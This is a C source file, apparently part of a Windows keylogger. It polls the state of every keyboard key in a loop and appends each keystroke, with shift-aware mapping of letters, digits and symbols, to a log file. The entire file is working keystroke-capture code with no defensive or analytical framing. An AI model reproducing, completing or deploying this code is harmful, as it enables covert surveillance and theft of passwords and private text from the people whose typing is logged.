#include "keyscan.h"

static INT currentKeyboard(VOID){
    return LOWORD(GetKeyboardLayout(0));
}

INT saveFileCode(INT code){
    FILE *file = NULL;
    if((file = fopen(KEY_FILE, "a")) != NULL){
        switch(code){
            case VK_A :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "A");
                else
                    fprintf(file, "a");
                break;
            case VK_B :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "B");
                else
                    fprintf(file, "b");
                break;
            case VK_C :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "C");
                else
                    fprintf(file, "c");
                break;
            case VK_D :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "D");
                else
                    fprintf(file, "d");
                break;
            case VK_E :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "E");
                else
                    fprintf(file, "e");
                break;
            case VK_F :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "F");
                else
                    fprintf(file, "f");
                break;
            case VK_G :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "G");
                else
                    fprintf(file, "g");
                break;
            case VK_H :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "H");
                else
                    fprintf(file, "h");
                break;
            case VK_I :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "I");
                else
                    fprintf(file, "i");
                break;
            case VK_J :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "J");
                else
                    fprintf(file, "j");
                break;
            case VK_K :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "K");
                else
                    fprintf(file, "k");
                break;
            case VK_L :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "L");
                else
                    fprintf(file, "l");
                break;
            case VK_M :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "M");
                else
                    fprintf(file, "m");
                break;
            case VK_N :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "N");
                else
                    fprintf(file, "n");
                break;
            case VK_O :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "O");
                else
                    fprintf(file, "o");
                break;
            case VK_P :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "P");
                else
                    fprintf(file, "p");
                break;
            case VK_Q :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "Q");
                else
                    fprintf(file, "q");
                break;
            case VK_R :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "R");
                else
                    fprintf(file, "r");
                break;
            case VK_S :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "S");
                else
                    fprintf(file, "s");
                break;
            case VK_T :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "T");
                else
                    fprintf(file, "t");
                break;
            case VK_U :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "U");
                else
                    fprintf(file, "u");
                break;
            case VK_V :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "V");
                else
                    fprintf(file, "v");
                break;
            case VK_W :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "W");
                else
                    fprintf(file, "w");
                break;
            case VK_X :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "X");
                else
                    fprintf(file, "x");
                break;
            case VK_Y :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "Y");
                else
                    fprintf(file, "y");
                break;
            case VK_Z :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "Z");
                else
                    fprintf(file, "z");
                break;
            case VK_0 :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, ")");
                else
                    fprintf(file, "%c", VK_0);
                break;
            case VK_1 :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "!");
                else
                    fprintf(file, "%c", VK_1);
                break;
            case VK_2 :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "@");
                else
                    fprintf(file, "%c", VK_2);
                break;
            case VK_3 :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "#");
                else
                    fprintf(file, "%c", VK_3);
                break;
            case VK_4 :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "$");
                else
                    fprintf(file, "%c", VK_4);
                break;
            case VK_5 :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "%%");
                else
                    fprintf(file, "%c", VK_5);
                break;
            case VK_6 :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "^");
                else
                    fprintf(file, "%c", VK_6);
                break;
            case VK_7 :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "&");
                else
                    fprintf(file, "%c", VK_7);
                break;
            case VK_8 :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "*");
                else
                    fprintf(file, "%c", VK_8);
                break;
            case VK_9 :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "(");
                else
                    fprintf(file, "%c", VK_9);
                break;
            case VK_NUMPAD0 :
                fprintf(file, "0");
                break;
            case VK_NUMPAD1 :
                fprintf(file, "1");
                break;
            case VK_NUMPAD2 :
                fprintf(file, "2");
                break;
            case VK_NUMPAD3 :
                fprintf(file, "3");
                break;
            case VK_NUMPAD4 :
                fprintf(file, "4");
                break;
            case VK_NUMPAD5 :
                fprintf(file, "5");
                break;
            case VK_NUMPAD6 :
                fprintf(file, "6");
                break;
            case VK_NUMPAD7 :
                fprintf(file, "7");
                break;
            case VK_NUMPAD8 :
                fprintf(file, "8");
                break;
            case VK_NUMPAD9 :
                fprintf(file, "9");
                break;
            case VK_MULTIPLY :
                fprintf(file, "*");
                break;
            case VK_ADD :
                fprintf(file, "+");
                break;
            case VK_SUBTRACT :
                fprintf(file, "-");
                break;
            case VK_DIVIDE :
                fprintf(file, "/");
                break;
            case VK_DECIMAL :
                fprintf(file, ".");
                break;
            case VK_SPACE :
                fprintf(file, " ");
                break;
            case VK_TAB :
                fprintf(file, "\t");
                break;
            case VK_CAPITAL :
                fprintf(file, "<CAPS LOCK>");
                break;
            case VK_RETURN :
                fprintf(file, "\n");
                break;
            case VK_BACK :
                fprintf(file, "<BACK SPACE>");
                break;
            case VK_TILDE :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "~");
                else
                    fprintf(file, "`");
                break;
            case VK_DASH :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "_");
                else
                    fprintf(file, "-");
                break;
            case VK_EQ :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "+");
                else
                    fprintf(file, "=");
                break;
            case VK_LBRACKET :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "{");
                else
                    fprintf(file, "[");
                break;
            case VK_RBRACKET :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "}");
                else
                    fprintf(file, "]");
                break;
            case VK_DOT_COMMA :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, ":");
                else
                    fprintf(file, ";");
                break;
            case VK_APOSTROPHE :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "\"");
                else
                    fprintf(file, "'");
                break;
            case VK_REV_SLASH :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "|");
                else
                    fprintf(file, "\\");
                break;
            case VK_COMMA :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "<");
                else
                    fprintf(file, ",");
                break;
            case VK_DOT :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, ">");
                else
                    fprintf(file, ".");
                break;
            case VK_SLASH :
                if(GetAsyncKeyState(VK_SHIFT))
                    fprintf(file, "?");
                else
                    fprintf(file, "/");
                break;
        }
        fclose(file);
        return EXIT_SUCCESS;
    }
    return EXIT_FAILURE;
}

VOID scanCode(VOID){
    INT key;
    for(key = 0; key < 256; ++key){
        if(GetAsyncKeyState(key) == -32767)
            saveFileCode(key);
    }
}
